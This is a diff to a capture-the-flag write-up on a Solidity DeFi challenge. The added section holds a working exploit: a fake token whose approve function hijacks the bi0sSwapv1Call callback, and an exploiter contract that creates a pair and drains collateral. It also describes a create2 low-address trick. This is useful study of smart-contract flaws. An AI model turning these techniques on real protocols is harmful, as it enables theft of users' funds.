@@ -105,7 +105,7 @@ Can you see what was never meant to stay?
         }
         ```
 
-- The revenge version mainly updates the modifier of the function `depositCollateralThroughSwap` from `acceptedToken(_otherToken)` to `acceptedToken(_collateralToken)`. So, we can not use unverified `_collateralToken`. However, since the `_otherToken` is not checked, we can create a token, whose `approve` function calls Bi0sSwapPair's `swap` function with controllable data.
+- The revenge version mainly updates the modifier of the function `depositCollateralThroughSwap` from `acceptedToken(_otherToken)` to `acceptedToken(_collateralToken)`. So, we can not use unverified `_collateralToken`. However, since the `_otherToken` is not checked, we can create a token, whose `approve` function calls Bi0sSwapPair's `swap` function with controllable data and gains control over the function `bi0sSwapv1Call`. Remember to set the value of transient storage slot 1 back to the corresponding Bi0sSwapPair to ensure the subsequent execution of the function `depositCollateralThroughSwap` can proceed successfully.
 
     ```diff
     - function depositCollateralThroughSwap(address _otherToken,address _collateralToken,uint256 swapAmount,uint256 _collateralDepositAmount)public acceptedToken(_otherToken)returns (uint256 tokensSentToUserVault){
@@ -124,7 +124,79 @@ Can you see what was never meant to stay?
     }
     ```
 
-- Or, with the initial 80,000 ethers, we can exchange for `0x38c0bdc4ade139d62d90d2ad2c3f98efb` SAFEMOON tokens, which is slightly less than a regular 20-byte address. However, we can create a contract with an address starting with `0x0000`, making its address numerically smaller than the amount of SAFEMOON we can obtained. Then, we can use the previously described method to gain control over the function `bi0sSwapv1Call`.
+    ??? note "Exploit via Approve"
+
+        ```js
+        contract Fake is SafeMoon {
+            WETH weth;
+            SafeMoon safeMoon;
+            USDSEngine usdsEngine;
+            address owner;
+            address pair;
+
+            constructor(WETH _weth, SafeMoon _safeMoon, USDSEngine _usdsEngine) SafeMoon(type(uint).max) {
+                weth = _weth;
+                safeMoon = _safeMoon;
+                usdsEngine = _usdsEngine;
+                owner = msg.sender;
+            }
+
+            function setPair(address _pair) public {
+                pair = _pair;
+            }
+
+            function approve(address spender, uint256 amount) public override returns (bool) {
+                if (spender == pair) {
+                    weth.approve(spender, 1);
+                    IBi0sSwapPair(spender).swap(address(weth), 1, address(usdsEngine), abi.encode(0));
+
+                    uint256 FLAG_HASH = uint256(keccak256("YOU NEED SOME BUCKS TO GET FLAG")) + 1;
+                    usdsEngine.bi0sSwapv1Call(owner, address(weth), FLAG_HASH + uint160(address(this)), abi.encode(FLAG_HASH));
+                    usdsEngine.bi0sSwapv1Call(owner, address(safeMoon), FLAG_HASH + uint160(address(this)), abi.encode(FLAG_HASH));
+                    usdsEngine.bi0sSwapv1Call(owner, address(this), uint160(spender), abi.encode(0));
+                }
+                return super.approve(spender, amount);
+            }
+        }
+
+        contract ExploiterUsingApprove {
+            Setup setup;
+            IBi0sSwapFactory factory;
+
+            WETH weth;
+            SafeMoon safeMoon;
+
+            USDSEngine usdsEngine;
+
+            constructor(Setup _setup) payable {
+                setup = _setup;
+                factory = _setup.bi0sSwapFactory();
+                weth = _setup.weth();
+                safeMoon = _setup.safeMoon();
+                usdsEngine = _setup.usdsEngine();
+
+                _setup.setPlayer(address(this));
+            }
+
+            function exploit() external {   
+                Fake fake = new Fake(weth, safeMoon, usdsEngine);
+                address fakePair = factory.createPair(address(weth), address(fake));
+                fake.setPair(fakePair);
+                uint addressAmount = uint160(address(fake));
+                fake.transfer(fakePair, addressAmount * 2);
+                weth.deposit{value: 2}(address(this));
+                weth.transfer(fakePair, 1);
+                IBi0sSwapPair(fakePair).addLiquidity(address(this));
+
+                weth.transfer(address(fake), 1);
+                fake.approve(address(usdsEngine), 1);
+                usdsEngine.depositCollateralThroughSwap(address(fake), address(weth), 1, 0); 
+            }
+
+        }
+        ```
+
+- Or, with the initial 80,000 ethers, we can exchange for `0x38c0bdc4ade139d62d90d2ad2c3f98efb` SAFEMOON tokens, which is slightly less than a regular 20-byte address. However, we can deploy an exploiter with an address starting with `0x00000000` via `cast create2`, making its address numerically smaller than the amount of SAFEMOON we can obtained. Then, we can use the previously described method to gain control over the function `bi0sSwapv1Call`.
 
 ### Flag
 
